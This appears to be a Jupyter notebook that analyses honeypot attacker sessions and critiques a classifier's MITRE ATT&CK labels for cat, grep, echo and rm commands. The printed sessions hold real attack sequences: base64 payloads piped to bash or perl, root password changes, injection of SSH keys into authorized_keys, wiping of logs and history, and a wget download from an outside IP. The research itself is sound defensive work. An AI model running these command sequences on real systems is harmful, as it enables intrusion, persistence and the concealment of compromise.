# %% [markdown]
# sembrano legit in caso ricontrolla dopo aver runnato le tue

# %% [markdown]
# # Sessions
# Those are the session used to comment on the first part of task 4

# %% [markdown]
# # analysis of session :cat

# %%
# Cat
res_df[
    res_df["cat_pred"].apply(lambda x: len(x) > 0 and "Discovery" in x and "Execution" in x)
]
# Out:
#                                                   session  \
# 121     cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 185     cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 280     cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 430     cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 532     cat /proc/cpuinfo | grep name | wc -l ; echo -...
# ...                                                   ...
# 98088   cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 121763  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 126015  cat /proc/cpuinfo | grep name | wc -l ; echo "...
# 130500  cat /proc/cpuinfo | grep name | wc -l ; echo "...
# 131633  cat /proc/cpuinfo | grep name | wc -l ; echo -...
#
#                    timestamps_statements    country_name  \
# 121     2019-09-01 19:02:12.555418+00:00           China
# 185     2019-09-02 05:44:33.937028+00:00           Italy
# 280     2019-09-02 20:16:04.792261+00:00           China
# ...

# %%
# Cat
res_df[
    res_df["cat_pred"].apply(lambda x: len(x) > 0 and "Discovery" in x and "Execution" in x)
].iloc[0]["cat_pred"]
# Out:
# ['Discovery', 'Discovery', 'Discovery', 'Discovery', 'Execution', 'Execution']

# %%
# Cat
res_df[
    res_df["cat_pred"].apply(lambda x: len(x) > 0 and "Discovery" in x and "Execution" in x)
].iloc[0]["session"]
# Out:
# 'cat /proc/cpuinfo | grep name | wc -l ; echo -e "admin\\nvqckfz14Dsq3\\nvqckfz14 ; Enter new UNIX password: ; echo "admin\\nvqckfz14Dsq3\\nvqckfz14 ; echo "321" > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk \'{print $4,$5,$6,$7,$8,$9;}\' ; free -m | grep Mem | awk \'{print $2 ,$3, $4, $5, $6, $7}\' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo "admin admin" > /tmp/up.txt ; rm -rf /var/tmp/dota* ; cat /var/tmp/.systemcache436621 ; echo "1" > /var/tmp/.systemcache436621 ; cat /var/tmp/.systemcache436621 ; sleep 15s && cd /var/tmp; echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKc | base64 --decode | bash'

# %% [markdown]
# For this session we have that Cat is assigned both to Discovery and execution
# - Discovery: we can notice that in this example the cat that are identified as Discovery all try to access /proc/cpuinfo that contains info about the CPU (processor, ids, chache size and so on, or trying yo access temporary file
# - Execution: cat command that are associated to Execution might depend on the content of the temporary file, depending if the file is an executable or not

# %% [markdown]
# # Grep analysis

# %%
# Cat
res_df[
    res_df["grep_pred"].apply(lambda x: len(x) > 0 and "Discovery" in x and "Persistence" in x)
]
# Out:
#                                                   session  \
# 15065   scp -t ~/g1z6qa8stkossi9oqgnbinabjp ; LC_ALL=C...
# 16307   LC_ALL=C cat /etc/rc.local /etc/rc.d/rc.local ...
# 75315   scp -t ~/jl3ih0wlzz9g1zc3cttoj0ac4h ; LC_ALL=C...
# 84881   scp -t ~/pmr1ajxide0a16oltuj1pfmduc ; LC_ALL=C...
# 110612  scp -t ~/8pxvcn4uy0p5hb8vr3618epwdd ; LC_ALL=C...
# 110617  scp -t ~/722doaiugez06j6ym3yf4ojkvd ; LC_ALL=C...
#
#                    timestamps_statements   country_name  \
# 15065   2019-10-03 15:28:02.000159+00:00         Israel
# 16307   2019-10-07 21:17:35.454703+00:00  United States
# 75315   2019-11-16 18:18:59.098409+00:00  United States
# 84881   2019-11-22 18:55:46.772679+00:00  United States
# 110612  2019-12-05 07:09:16.227604+00:00     Seychelles
# 110617  2019-12-05 07:10:46.031075+00:00     Seychelles
#
#                                timestamp  \
# 15065   2019-10-03 15:28:02.000159+00:00
# 16307   2019-10-07 21:17:35.454703+00:00
# ...

# %%
# Grep
res_df[
    res_df["grep_pred"].apply(lambda x: len(x) > 0 and "Discovery" in x and "Persistence" in x)
].iloc[0]["grep_pred"]
# Out:
# ['Discovery', 'Persistence']

# %%
# Grep
res_df[
    res_df["grep_pred"].apply(lambda x: len(x) > 0 and "Discovery" in x and "Persistence" in x)
].iloc[0]["session"]
# Out:
# 'scp -t ~/g1z6qa8stkossi9oqgnbinabjp ; LC_ALL=C ~/g1z6qa8stkossi9oqgnbinabjp ; LC_ALL=C rm -f ~/g1z6qa8stkossi9oqgnbinabjp ; LC_ALL=C chattr -i -a ~/.dhpcd ; LC_ALL=C rm -f ~/.dhpcd ; LC_ALL=C rmdir ~/.dhpcd ; scp -t ~/.dhpcd ; LC_ALL=C ~/.dhpcd ; LC_ALL=C cat /proc/cpuinfo ; LC_ALL=C echo ~ ; LC_ALL=C chattr -i -a /etc/shadow ; LC_ALL=C passwd ; LC_ALL=C passwd ; LC_ALL=C passwd test ; LC_ALL=C passwd test ; LC_ALL=C passwd oracle ; LC_ALL=C passwd oracle ; LC_ALL=C passwd test1 ; LC_ALL=C passwd test1 ; LC_ALL=C chattr +a /etc/shadow ; LC_ALL=C mkdir -p ~/.ssh ; LC_ALL=C chmod 700 ~/.ssh ; LC_ALL=C grep "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ >>~/.ssh/authorized_keys ; LC_ALL=C grep "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ >>~/.ssh/authorized_keys'

# %% [markdown]
# This Session is quite strange because in this case grep has 2 prediction in which the neighboors of words are similar but the prediction are similar
# - Discovery: The attacker is querying the system state — in this case, whether the SSH key is already installed. This qualifies as Discovery under the MITRE ATT&CK framework because it's gathering information about authentication configuration before making changes.
# - Persitence: At this point in the script, the attack is already appending the SSH key to authorized_keys, enabling persistence via SSH access. Even though grep is reading, it's part of an idempotent step to ensure the key isn't appended multiple times. It might be considerd still as a discovery step done in support of a perstistence step

# %% [markdown]
# ## Echo Analysis
#
#     Execution: 336437 (44.4%)
#     Persistence: 214989 (28.4%)
#     Discovery: 204576 (27.0%)
#     Not Malicious Yet: 1694 (0.2%)
#     Other: 190 (0.0%)
#     Impact: 5 (0.0%)
#     Defense Evasion: 1 (0.0%)

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0 and "Discovery" in x and "Persistence" in x and "Execution" in x and "Not Malicious Yet" in x)
]
# Out:
#                                                   session  \
# 20811   cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 23917   cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 34750   cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 57161   cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 78448   cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 103699  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 116703  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 124210  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 127717  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 135908  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 135944  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 142891  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 145349  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 147777  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# 156556  cat /proc/cpuinfo | grep name | wc -l ; echo -...
# ...

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0 and "Discovery" in x and "Persistence" in x and "Execution" in x and "Not Malicious Yet" in x)
].iloc[5]["echo_pred"]
# Out:
# ['Execution', 'Not Malicious Yet', 'Persistence', 'Discovery']

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0 and "Discovery" in x and "Persistence" in x and "Execution" in x and "Not Malicious Yet" in x)
].iloc[5]["session"]
# Out:
# 'cat /proc/cpuinfo | grep name | wc -l ; echo -e "printemps\\nzKoktZKWM6EL\\nzKok ; echo "printemps\\nzKoktZKWM6EL\\nzKok ; echo "321" > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk \'{print $4,$5,$6,$7,$8,$9;}\' ; free -m | grep Mem | awk \'{print $2 ,$3, $4, $5, $6, $7}\' ; ls -lh $(which ls) ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo "admin printemps" > /tmp/up.txt ; rm -rf /var/tmp/dota*'

# %% [markdown]
# Looking at the echo command sequence, it seems we are dealing with a long, concatenated command (with improperly closed quotation marks or ticks), likely intended for execution in parts elsewhere. Here's a breakdown of the predictions:
#
#     Execution: The first echo appears to output a sequence that could later be used for execution. Given that it might be piped or passed to another command in a larger context, classifying it as Execution is reasonable.
#
#     Not Malicious Yet: This echo command outputs some data, but its destination or usage is not clear. Since it doesn’t directly indicate malicious behavior, the classification as Not Malicious Yet is acceptable, though ambiguous.
#
#     Persistence: The third echo writes a value ("321") to a temporary file. This could be part of an attempt to stage a payload or maintain access. Since it involves writing to the filesystem, the label Persistence is appropriate.
#
#     Discovery: The final echo writes what looks like credentials ("admin ascend") to a file. This is not about gathering system information but rather establishing persistence. Therefore, labeling it as Discovery is incorrect; Persistence would be more accurate.

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0 and "Defense Evasion" in x)
]
# Out:
#                                                   session  \
# 159295  w ; sudo su ; ls -a ; rm -rf .ssh .profile .ba...
#
#                    timestamps_statements    country_name  \
# 159295  2019-12-18 15:28:06.934104+00:00  United Kingdom
#
#                                timestamp  \
# 159295  2019-12-18 15:28:06.934104+00:00
#
#                                                     words  \
# 159295  [w, ;, sudo, su, ;, ls, -a, ;, rm, -rf, .ssh, ...
#
#                                            predicted_tags  \
# 159295  [Persistence, Persistence, Persistence, Persis...
#
#                                                    splits cat_idx grep_idx  \
# 159295  [w, ;, sudo, su, ;, ls, -a, ;, rm, -rf, .ssh, ...    [83]       []
#
#          echo_idx                                   rm_idx validation_status  \
# 159295  [43, 102]  [8, 34, 37, 40, 47, 50, 67, 72, 79, 92]                OK
#
#        token_label_diff     cat_pred grep_pred  \
# ...

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0 and "Defense Evasion" in x)
].iloc[0]["session"]
# Out:
# 'w ; sudo su ; ls -a ; rm -rf .ssh .profile .bashrc .bash_logout ; set +o history ; unset HISTFILE ; unset HISTSAVE ; unset SAVEFILE ; unset WATCH ; history -n ; rm -rf /var/log/wtmp ;rm -rf /var/log/lastlog ;rm -rf /var/log/secure ;echo done...;rm -rf /var/log/xferlog ;rm -rf /var/log/messages ;rm -rf /var/run/utmp ;touch /var/run/utmp ;touch /var/log/messages ;touch /var/log/wtmp ;touch /var/log/messages ;touch /var/log/xferlog ;touch /var/log/secure ;touch /var/log/lastlog ;rm -rf /var/log/maillog ;touch /var/log/maillog ;rm -rf /root/.bash_history ;touch /root/.bash_history ;history -r ;rm -rf *.log ; cat /proc/cpuinfo ; ps x|grep stratum ; lscpu ; rm -rf .ssh ; mkdir .ssh ; cd .ssh ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBbHn rsa-key-20131125" >> authorized_keys ; chmod 700 ~/.ssh;chmod 600 ~/.ssh/authorized_keys ; passwd ; password ; cd /var/tmp ; ls -a ; kill -9 -1'

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0 and "Defense Evasion" in x)
].iloc[0]["echo_pred"]
# Out:
# ['Defense Evasion', 'Persistence']

# %% [markdown]
# - Defense Evasion: Rather than letting the script spit out dozens of file-removal messages (e.g. removed ‘/var/log/secure’, etc.), the attacker prints a single, innocuous “done…” message. This is a way to reduce noise output and making the victim that everything is ok

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0  and "Impact" in x)
]
# Out:
#                                                   session  \
# 67932   cat /proc/cpuinfo | grep name | wc -l ; cat /p...
# 68229   cat /proc/cpuinfo | grep name | wc -l ; cat /p...
# 153831  cat /proc/cpuinfo | grep name | wc -l ; echo -...
#
#                    timestamps_statements country_name  \
# 67932   2019-11-12 03:22:58.016214+00:00        China
# 68229   2019-11-12 07:52:25.044706+00:00        China
# 153831  2019-12-16 10:11:20.817141+00:00    Indonesia
#
#                                timestamp  \
# 67932   2019-11-12 03:22:58.016214+00:00
# 68229   2019-11-12 07:52:25.044706+00:00
# 153831  2019-12-16 10:11:20.817141+00:00
#
#                                                     words  \
# 67932   [cat, /proc/cpuinfo, |, grep, name, |, wc, -l,...
# 68229   [cat, /proc/cpuinfo, |, grep, name, |, wc, -l,...
# 153831  [cat, /proc/cpuinfo, |, grep, name, |, wc, -l,...
#
#                                            predicted_tags  \
# ...

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0  and "Impact" in x)
].iloc[2]["session"]
# Out:
# 'cat /proc/cpuinfo | grep name | wc -l ; echo -e "logout\\nOpZAboBBbFCB\\nOpZAboB ; echo "logout\\nOpZAboBBbFCB\\nOpZAboB ; echo "321" > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk \'{print $4,$5,$6,$7,$8,$9;}\' ; free -m | grep Mem | awk \'{print $2 ,$3, $4, $5, $6, $7}\' ; ls -lh $(which ls) ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo "admin logout" > /tmp/up.txt ; rm -rf /var/tmp/dota*'

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0  and "Impact" in x)
].iloc[2]["echo_pred"]
# Out:
# ['Persistence', 'Persistence', 'Persistence', 'Impact']

# %% [markdown]
# - Impact:

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0  and "Other" in x)
].iloc[2]["session"]
# Out:
# 'cd /tmp || /var/tmp || /dev/shm; echo "ZXZhbCB1bnBhY2sgdT0+cXtfIkZVW | base64 --decode | perl ; rm -rf /var/tmp/dota* ; sleep 15s && cd /var/tmp; echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKc | base64 --decode | bash ; cat /proc/cpuinfo | grep name | wc -l ; echo "root:T5NsRMZCOGNl"|chpasswd|b ; echo "321" > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk \'{print $4,$5,$6,$7,$8,$9;}\' ; free -m | grep Mem | awk \'{print $2 ,$3, $4, $5, $6, $7}\' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model'

# %%
# Echo
res_df[
    res_df["echo_pred"].apply(lambda x: len(x) > 0  and "Other" in x)
].iloc[2]["echo_pred"]
# Out:
# ['Other', 'Execution', 'Discovery', 'Discovery']

# %% [markdown]
# - Other: Loking at the echo it seems like we are passing a base 64 encoded string trough a pipe, that will be used by perl, so it could be considered as an execution, So this could be considered as a wrong influenced that is probalby influenced by the surrounding words

# %% [markdown]
# # Rm Analysis
#
#     Discovery: 257772 (75.2%)
#     Execution: 58020 (16.9%)
#     Defense Evasion: 19496 (5.7%)
#     Persistence: 7387 (2.2%)

# %%
# Echo
res_df[
    res_df["rm_pred"].apply(lambda x: len(x) > 0  and "Discovery" in x and "Execution" in x and "Persistence" in x and "Defense Evasion" in x)
].iloc[0]["rm_pred"]
# Out:
# ['Persistence',
#  'Defense Evasion',
#  'Discovery',
#  'Discovery',
#  'Discovery',
#  'Discovery',
#  'Discovery',
#  'Discovery',
#  'Discovery',
#  'Persistence',
#  'Execution']

# %%
# Echo
res_df[
    res_df["rm_pred"].apply(lambda x: len(x) > 0  and "Discovery" in x and "Execution" in x and "Persistence" in x and "Defense Evasion" in x)
].iloc[0]["session"]
# Out:
# 'w ; ls -a ; rm -rf .dhpcd .profile .bash_logout .bashrc .ssh ; set +o history ; unset HISTFILE ; unset HISTSAVE ; unset SAVEFILE ; unset WATCH ; history -n ; rm -rf /var/log/wtmp ;rm -rf /var/log/lastlog ;rm -rf /var/log/secure ;echo done...;rm -rf /var/log/xferlog ;rm -rf /var/log/messages ;rm -rf /var/run/utmp ;touch /var/run/utmp ;touch /var/log/messages ;touch /var/log/wtmp ;touch /var/log/messages ;touch /var/log/xferlog ;touch /var/log/secure ;touch /var/log/lastlog ;rm -rf /var/log/maillog ;touch /var/log/maillog ;rm -rf /root/.bash_history ;touch /root/.bash_history ;history -r ;rm -rf *.log ; cat /proc/cpuinfo ; ps x|grep stratum ; lscpu ; rm -rf .ssh ; mkdir .ssh ; cd .ssh ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBbHn rsa-key-20131125" >> authorized_keys ; chmod 700 ~/.ssh;chmod 600 ~/.ssh/authorized_keys ; wget -q ftp://web1:12345@95.110.228.14 ; tar xvf has-CruD-5.1.tgz ; cd .systemd-private-service ; rm -rf has-CruD-5.1.tgz ; ls -a ; wget -q ftp://web1:12345@95.110.228
# ...
